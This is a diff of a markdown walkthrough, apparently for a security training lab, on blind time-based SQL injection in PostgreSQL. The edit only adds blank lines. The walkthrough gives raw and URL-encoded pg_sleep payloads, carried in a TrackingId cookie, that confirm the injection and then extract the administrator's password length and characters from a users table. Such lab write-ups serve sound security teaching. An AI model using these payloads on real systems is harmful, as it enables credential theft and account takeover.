@@ -21,6 +21,7 @@ ___
 step 1
 
 `';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--`
+
 `'%3bSELECT+CASE+WHEN+(1%3d1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`
 
 ```sql
@@ -32,6 +33,7 @@ when you send request it will take around 10 second then you will get 200 respon
 
 step 2
 `';SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--`
+
 `'%3bSELECT+CASE+WHEN+(1%3d2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`
 
 ```sql
@@ -43,6 +45,7 @@ when you send request it will take around 2 second then you will get 200 respons
 
 step 3
 `';SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--`
+
 `'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
 
 ```sql
@@ -54,6 +57,7 @@ when you send request it will take around 10 second then you will get 200 respon
 
 step 4
 `';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--`
+
 `'%3bSELECT+CASE+WHEN+(username%3d'administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
 
 ```sql
@@ -66,6 +70,7 @@ when you send request it will take around 10 second then you will get 200 respon
 step 5
 
 `'%3bSELECT+CASE+WHEN+(username%3d'administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
+
 `'%3bSELECT+CASE+WHEN+(username%3d'administrator'+AND+LENGTH(password)>§1§)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
 
 ```sql
@@ -79,6 +84,7 @@ TrackingId=tax9NfTM7uDS6d4O'%3bSELECT+CASE+WHEN+(username%3d'administrator'+AND+
 step 6
 
 `';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--`
+
 `'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
 
 ```sql
